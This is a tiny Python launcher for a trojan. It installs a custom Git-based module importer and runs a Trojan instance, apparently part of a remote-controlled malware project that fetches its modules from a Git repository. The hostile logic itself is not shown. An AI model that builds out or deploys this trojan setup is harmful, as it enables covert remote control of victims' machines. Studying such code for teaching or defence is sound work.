import sys


from modules.trojan import Trojan
from modules.gitimporter import GitImporter


if __name__ == '__main__':
    sys.meta_path.append(GitImporter())
    trojan = Trojan('abc')
    trojan.run()